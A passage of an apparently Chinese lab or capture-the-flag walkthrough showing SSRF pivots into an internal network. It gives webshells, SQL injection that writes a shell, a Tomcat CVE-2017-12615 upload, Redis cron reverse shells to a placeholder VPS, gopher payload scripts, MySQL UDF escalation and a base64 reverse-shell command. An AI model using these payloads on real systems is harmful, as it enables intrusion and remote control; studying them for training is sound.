&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = requests.post(url, data=payload, timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;HTTP/1.1&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span> - Web 服务&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;NOAUTH Authentication required&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span> - Redis 服务(需密码认证)&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;+OK&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span> - Redis 服务(未授权漏洞)&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;mysql_native_password&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span> - MySQL 服务(需密码认证)&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.Timeout:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span> - 请求超时&quot;</span>)  <span class="comment"># 超时处理</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span> - 错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] - 扫描结束&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>探测信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">192.168.100.21:80 - Web 服务</span><br><span class="line">192.168.100.22:80 - Web 服务</span><br><span class="line">192.168.100.23:80 - Web 服务</span><br><span class="line">192.168.100.24:80 - Web 服务</span><br><span class="line">192.168.100.26:8080 - Web 服务</span><br><span class="line">192.168.100.27:6379 - Redis 服务(未授权漏洞)</span><br><span class="line">192.168.100.28:6379 - Redis 服务(需密码认证)</span><br><span class="line">192.168.100.29:3306 - MySQL 服务(无密码认证)</span><br><span class="line">[*] - 扫描结束</span><br></pre></td></tr></table></figure>
+<h2 id="1921681002280-代码注入"><a class="markdownIt-Anchor" href="#1921681002280-代码注入"></a> 192.168.100.22:80-代码注入</h2>
+<p>存在shell.php，代码执行，用ssrf请求192.168.100.22的shell.php执行命令即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url=http://192.168.100.22/shell.php?cmd=ls</span><br><span class="line">url=http://192.168.100.22/shell.php?cmd=cat%20flag</span><br><span class="line">url=http://192.168.100.22/shell.php?cmd=ls%20/</span><br><span class="line">url=http://192.168.100.22/shell.php?cmd=cat%20/etc/hosts</span><br></pre></td></tr></table></figure>
+<h2 id="1921681002380-sql注入"><a class="markdownIt-Anchor" href="#1921681002380-sql注入"></a> 192.168.100.23:80-SQL注入</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://192.168.100.23/?id=1</span><br></pre></td></tr></table></figure>
+<p><img src="../images/QQ20250403-111356.jpg" alt="1" /></p>
+<p>直接写马：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url=http://192.168.100.23/?id=-1&#x27;union%20select%201,2,3,&#x27;&lt;?php%20system($_GET[1]);&#x27;%20into%20outfile%20&#x27;/var/www/html/2.php&#x27;--+</span><br><span class="line"></span><br><span class="line">url=http://192.168.100.23/2.php?1=ls /</span><br></pre></td></tr></table></figure>
+<h2 id="1921681002480-ping命令执行post"><a class="markdownIt-Anchor" href="#1921681002480-ping命令执行post"></a> 192.168.100.24:80-ping命令执行(POST)</h2>
+<p><img src="../images/image-20260301215615267.png" alt="image-20260301215615267" /></p>
+<p>一个ping命令执行拼接，且是POST方法</p>
+<p>但我们用ssrf无法请求某个内网IP的post方法</p>
+<h3 id="curl打法"><a class="markdownIt-Anchor" href="#curl打法"></a> curl打法</h3>
+<p>但我们可以尝试用23主机上的shell来执行curl，进而传post方法到24主机</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://192.168.100.23/2.php?1=system(&#x27;curl%20&quot;http://192.168.100.24/&quot;%20-X%20POST%20-d%20&quot;ip=127.0.0.1;ls&quot;&#x27;);</span><br></pre></td></tr></table></figure>
+<h3 id="gopher打法"><a class="markdownIt-Anchor" href="#gopher打法"></a> Gopher打法</h3>
+<p>但如果内网中没有getshell的主机了怎么办呢</p>
+<p>通常是<strong>利用 gopher 协议来发起对内网应用的 POST 请求了</strong></p>
+<p>这里直接拷贝国光的WP了：<a target="_blank" rel="noopener" href="https://www.sqlsec.com/2021/05/ssrf.html#SSRF-%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">手把手带你用 SSRF 打穿内网 | 国光</a></p>
+<p>gopher 的基本请求格式如下：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20210317/16159601558925.png"><img src="../images/16159601558925.png" alt="img" /></a></p>
+<p>gopher 协议是一个古老且强大的协议，从请求格式可以看出来，可以传递最底层的 TCP 数据流，因为 HTTP 协议也是属于 TCP 数据层的，所以通过 gopher 协议传递 HTTP 的 POST 请求也是轻而易举的。</p>
+<p>首先来抓取正常情况下 POST 请求的数据包，删除掉 HTTP 请求的这一行：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>如果不删除的话，打出的 SSRF 请求会乱码，因为被两次 gzip 编码了。</p>
+</blockquote>
+<p>接着在 Burpsuite 中将本 POST 数据包进行两次 URL 编码：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20210317/16159620724415.png"><img src="../images/16159620724415.png" alt="img" /></a></p>
+<p>两次 URL 编码后的数据就最终的 TCP 数据流，最终 SSRF 完整的攻击请求的 POST 数据包如下：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20210317/16159622165771.png"><img src="../images/16159622165771.png" alt="img" /></a></p>
+<p>可以看到通过 SSRF 成功攻击了 172.72.23.24 的命令执行 Web 应用，顺利执行了 <code>cat /etc/hosts</code> 的命令：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20210317/16159623108967.png"><img src="../images/16159623108967.png" alt="img" /></a></p>
+<h2 id="1921681002580-xxe"><a class="markdownIt-Anchor" href="#1921681002580-xxe"></a> 192.168.100.25:80-XXE</h2>
+<p>XXE注入，没过滤，但依旧是POST传参，依旧用gopher打</p>
+<p>删除掉 <code>Accept-Encoding</code> 这一行，然后使用 Burpsuite 对 POST 数据包进行两次 URL 编码：</p>
+<p><img src="../images/image-20260301222751081.png" alt="image-20260301222751081" /></p>
+<h2 id="192168100268080-tomcat8519-cve-2017-12615"><a class="markdownIt-Anchor" href="#192168100268080-tomcat8519-cve-2017-12615"></a> 192.168.100.26:8080-Tomcat/8.5.19 CVE-2017-12615</h2>
+<p>是一个 Tomcat 中间件，存在 CVE-2017-12615 任意写文件漏洞</p>
+<blockquote>
+<p>如果内网其他主机可控且存在curl，可以直接curl发送PUT请求</p>
+</blockquote>
+<p>需要PUT传参一个jsp木马，先准备一个木马：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(command != <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> <span class="title class_">String</span>(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        out.print(<span class="string">&quot;format: xxx.jsp?cmd=Command&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p>然后抓包192.168.100.26的攻击数据包，进行二次 URL 编码</p>
+<p>然后用gopher协议打入即可</p>
+<p><img src="../images/image-20260301223110684.png" alt="image-20260301223110684" /></p>
+<p>然后</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://192.168.100.26/shell.jsp?cmd=ls</span><br></pre></td></tr></table></figure>
+<h2 id="192168100276379-redis未授权"><a class="markdownIt-Anchor" href="#192168100276379-redis未授权"></a> 192.168.100.27:6379-Redis未授权</h2>
+<p><code>dict</code>协议除了可以探测主机存活，还可以攻击未授权redis服务</p>
+<p>dict协议探测redis，返回了<code>+OK</code>，说明直接连接成功</p>
+<p>而27主机既没有web服务(写不了shell)，也没有SSH公私钥认证(写不了ssh公钥),只能尝试计划任务了</p>
+<h3 id="dict协议"><a class="markdownIt-Anchor" href="#dict协议"></a> dict协议</h3>
+<p>用ssrf打redis未授权一般用gopher或者dict协议打，gopher可以用脚本直接生成，这里看看dict协议</p>
+<p>利用dict进行ssrf攻击redis服务的格式如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict://172.72.23.27/&lt;redis命令&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="dict协议打定时任务getshell"><a class="markdownIt-Anchor" href="#dict协议打定时任务getshell"></a> dict协议打定时任务getshell</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清空 key</span></span><br><span class="line">dict://192.168.100.27:6379/flushall</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置要操作的路径为定时任务目录</span></span><br><span class="line">dict://192.168.100.27:6379/config set dir /var/spool/cron/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在定时任务目录下创建 root 的定时任务文件</span></span><br><span class="line">dict://192.168.100.27:6379/config set dbfilename root</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">写入 Bash 反弹 shell 的 payload</span></span><br><span class="line">dict://192.168.100.27:6379/set x &quot;\n* * * * * /bin/bash -i &gt;%26 /dev/tcp/VPS/9999 0&gt;%261\n&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">保存上述操作</span></span><br><span class="line">dict://192.168.100.27:6379/save</span><br></pre></td></tr></table></figure>
+<p>VPS监听等待一会即可反弹shell成功</p>
+<h2 id="192168100286379-redis密码认证"><a class="markdownIt-Anchor" href="#192168100286379-redis密码认证"></a> 192.168.100.28:6379-Redis密码认证</h2>
+<p>28主机的6379存在redis服务，但是需要密码认证，除6379外还开了80的web端口(dict探测会超时，需用http进行探测)</p>
+<p>ssrf访问是一个LFI</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;easy lfi&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>直接读本地文件拿密码：</p>
+<table>
+<thead>
+<tr>
+<th><code>/etc/redis/redis.conf</code></th>
+<th>最常见的默认路径（Debian/Ubuntu）</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/etc/redis.conf</code></td>
+<td>有些系统直接放在 <code>/etc</code> 下面（比如 CentOS）</td>
+</tr>
+<tr>
+<td><code>/usr/local/etc/redis.conf</code></td>
+<td>源码安装时的默认路径</td>
+</tr>
+<tr>
+<td><code>/opt/redis/redis.conf</code></td>
+<td>有些定制服务手动安装时会放这里</td>
+</tr>
+</tbody>
+</table>
+<p><img src="../images/image-20260301224209936.png" alt="image-20260301224209936" /></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">auth P@ssw0rd</span><br><span class="line">flushall</span><br><span class="line">config set dir /var/www/html/</span><br><span class="line">config set dbfilename 1.php</span><br><span class="line">set x &quot;&lt;?=highlight_file(__FILE__);eval(\$_GET[1]);?&gt;&quot;</span><br><span class="line">save</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
+<p><code>dict</code>协议一次只能执行一条redis命令，无密码的redis还好，一句一句执行，用来认证，就不能执行后续命令了。这里有密码，使用<code>gopher</code>协议</p>
+<p>用脚本生成：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_payload</span>(<span class="params">cmds</span>):</span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> cmd <span class="keyword">in</span> cmds:</span><br><span class="line">        parts = cmd.strip().split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">        payload += <span class="string">&quot;*%d\r\n&quot;</span> % <span class="built_in">len</span>(parts)</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> parts:</span><br><span class="line">            payload += <span class="string">&quot;$%d\r\n%s\r\n&quot;</span> % (<span class="built_in">len</span>(p), p)</span><br><span class="line">    <span class="keyword">return</span> quote(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Redis命令集：写 WebShell 的流程</span></span><br><span class="line">cmds = [</span><br><span class="line">    <span class="string">&quot;auth P@ssw0rd&quot;</span>,  <span class="comment"># 如果无密码，可删除此行</span></span><br><span class="line">    <span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">    <span class="string">&quot;config set dir /var/www/html/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;config set dbfilename 1.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;set x \&quot;&lt;?=highlight_file(__FILE__);eval($_GET[&#x27;1&#x27;]);?&gt;\&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;save&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.100.28&quot;</span></span><br><span class="line">port = <span class="number">6379</span></span><br><span class="line"><span class="comment"># 一次编码：处理空格 %20</span></span><br><span class="line">payload = redis_payload(cmds)</span><br><span class="line"><span class="comment"># 二次编码payload 处理斜杠根</span></span><br><span class="line">payload = quote_plus(payload)</span><br><span class="line">url = <span class="string">f&quot;gopher://<span class="subst">&#123;ip&#125;</span>:<span class="subst">&#123;port&#125;</span>/_<span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span>(url)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>写入webshell之后连接：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://192.168.100.28/1.php?1=ls</span><br></pre></td></tr></table></figure>
+<h2 id="192168100293306-未授权mysql"><a class="markdownIt-Anchor" href="#192168100293306-未授权mysql"></a> 192.168.100.29:3306-未授权mysql</h2>
+<h3 id="获取原始数据包"><a class="markdownIt-Anchor" href="#获取原始数据包"></a> 获取原始数据包</h3>
+<p>MySQL 需要密码认证时，服务器先发送 salt 然后客户端使用 salt 加密密码然后验证；但是当无需密码认证时直接发送 TCP/IP 数据包即可。所以这种情况下是可以直接利用 SSRF 漏洞攻击 MySQL 的。因为使用 gopher 协议进行攻击需要原始的 MySQL 请求的 TCP 数据包，所以还是和攻击 Redis 应用一样，这里我们使用 tcpdump 来监听抓取 3306 的认证的原始数据包：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># lo 回环接口网卡 -w 报错 pcapng 数据包</span></span><br><span class="line">tcpdump -i lo port 3306 -w mysql.pcapng</span><br></pre></td></tr></table></figure>
+<p>然后本地使用 MySQL 来执行一些测试命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -h127.0.0.1 -uroot -e &quot;select * from flag.test union select user(),&#x27;www.sqlsec.com&#x27;;&quot;</span><br><span class="line">+----------------+----------------------------------------+</span><br><span class="line">| id             | flag                                   |</span><br><span class="line">+----------------+----------------------------------------+</span><br><span class="line">| 1              | flag&#123;71***************************316&#125; |</span><br><span class="line">| root@127.0.0.1 | www.sqlsec.com                         |</span><br><span class="line">+----------------+----------------------------------------+</span><br></pre></td></tr></table></figure>
+<p>中止 tcpdump 使用 Wireshark 打开 <code>mysql.pcapng</code> 数据包，追踪 TCP 流 然后过滤出发给 3306 的数据：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20210508/16204668042945.png"><img src="../images/16204668042945.png" alt="img" /></a></p>
+<p>保存为原始数据「Show data as <code>Raw</code>」，并且整理成 1 行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a100000185a23f0000000001080000000000000000000000000000000000000000000000726f6f7400006d7973716c5f6e61746976655f70617373776f72640064035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f706964033530380f5f636c69656e745f76657273696f6e06352e362e3531095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d697420313d0000000373656c656374202a2066726f6d20666c61672e7465737420756e696f6e2073656c656374207573657228292c277777772e73716c7365632e636f6d270100000001</span><br></pre></td></tr></table></figure>
+<h3 id="生成-gopher-数据流"><a class="markdownIt-Anchor" href="#生成-gopher-数据流"></a> 生成 gopher 数据流</h3>
+<p>然后使用如下的 Python3 脚本将数据转化为 url 编码：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">results</span>(<span class="params">s</span>):</span><br><span class="line">    a=[s[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s),<span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;curl gopher://127.0.0.1:3306/_%&quot;</span>+<span class="string">&quot;%&quot;</span>.join(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    s=sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(results(s))</span><br></pre></td></tr></table></figure>
+<p>运行效果如下：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20210508/16204671626680.png"><img src="../images/16204671626680.png" alt="img" /></a></p>
+<h3 id="ssrf-之-查询数据库"><a class="markdownIt-Anchor" href="#ssrf-之-查询数据库"></a> SSRF 之 查询数据库</h3>
+<p>本地 curl 请求这个 gopher 协议的数据包看看：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20210508/16204672777528.png"><img src="../images/16204672777528.png" alt="img" /></a></p>
+<p>从图上可以看到 gopher 请求的数据包已经成功执行了，user () 和 数据库中的 flag 都可查询出来了。</p>
+<p>如果 curl 请求提示是一个二进制文件无法直接显示，所可以使用 <code>--output</code> 来输出到文件中，然后手动 cat 文件同样也可以看到 gopher 协议交互 MySQL 的执行结果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl gopher://127.0.0.1:3306/_xxx --output mysql_result  </span><br></pre></td></tr></table></figure>
+<h3 id="ssrf-之-mysql-提权"><a class="markdownIt-Anchor" href="#ssrf-之-mysql-提权"></a> SSRF 之 MySQL 提权</h3>
+<p>SSRF 攻击 MySQL 仅仅查询数据意义不大，不如直接 UDF 提权然后反弹 shell 出来更加直接，下面尝试使用 SSRF 来 UDF 提权内网的 MySQL 应用，关于 MySQL 更详细的文章可以参考我之前 MySQL 漏洞利用与提权 <a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html">MySQL 漏洞利用与提权</a> 。</p>
+<p>首先来寻找 MySQL 的插件目录，原生的 MySQL 命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -h127.0.0.1 -uroot -e <span class="string">&quot;show variables like </span></span><br><span class="line"><span class="string">&#x27;%plugin%&#x27;;&quot;</span></span><br></pre></td></tr></table></figure>
+<p>tcpdump 监听，使用 Wirshark 分析导出原始数据：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20210508/16204676811766.png"><img src="../images/16204676811766.png" alt="img" /></a></p>
+<p>使用脚本将原始数据转换 gopher 协议，得到的数据如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://127.0.0.1:3306/_%a2%00%00%01%85%a2%3f%00%00%00%00%01%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%65%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%04%33%35%35%34%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%36%2e%35%31%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%20%00%00%00%03%73%68%6f%77%20%76%61%72%69%61%62%6c%65%73%20%6c%69%6b%65%20%0a%27%25%70%6c%75%67%69%6e%25%27%01%00%00%00%01  </span><br></pre></td></tr></table></figure>
+<p>放入到 BP 中请求的话记得需要二次 URL 编码，可以直接获取到插件的目录信息 :</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20210508/16204679134706.png"><img src="../images/16204679134706.png" alt="img" /></a></p>
+<p>拿到 MySQL 的插件目录为：<code>/usr/lib/mysql/plugin/</code></p>
+<p>接着来写入动态链接库，原生的 MySQL 命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 因为 payload 太长 这里就先进入 MySQL 控制台</span></span><br><span class="line">$ mysql -h127.0.0.1 -uroot</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; SELECT 0x7f454c460...省略大量payload...0000000 INTO DUMPFILE <span class="string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>关于 UDF 提权的 UDF 命令可以参考国光写的这个 UDF 提权辅助页面：<a target="_blank" rel="noopener" href="https://www.sqlsec.com/tools/udf.html">MySQL UDF 提权十六进制查询 | 国光</a></p>
+</blockquote>
+<p>tcpdump 监听到的原始数据后，转换 gopher 协议，SSRF 攻击写入动态链接库，因为这个 gopher 协议的数据包非常长，BP 这边可能会出现 Waiting 卡顿的状态：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20210508/16204695776705.png"><img src="../images/16204695776705.png" alt="img" /></a></p>
+<p>不过问题不大，实际上 <a target="_blank" rel="noopener" href="http://udf.so">udf.so</a> 已经成功写入到 MySQL 的插件目录下了：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20210508/16204695857520.png"><img src="../images/16204695857520.png" alt="img" /></a></p>
+<p>以此类推，创建自定义函数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -h127.0.0.1 -uroot -e <span class="string">&quot;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.so&#x27;;&quot;</span></span><br></pre></td></tr></table></figure>
+<p>最后通过创建的自定义函数并执行系统命令将 shell 弹出来，原生命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -h127.0.0.1 -uroot -e <span class="string">&quot;select sys_eval(&#x27;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMTEuNTUuMi8yMzMzIDA+JjE=|base64 -d|bash -i&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
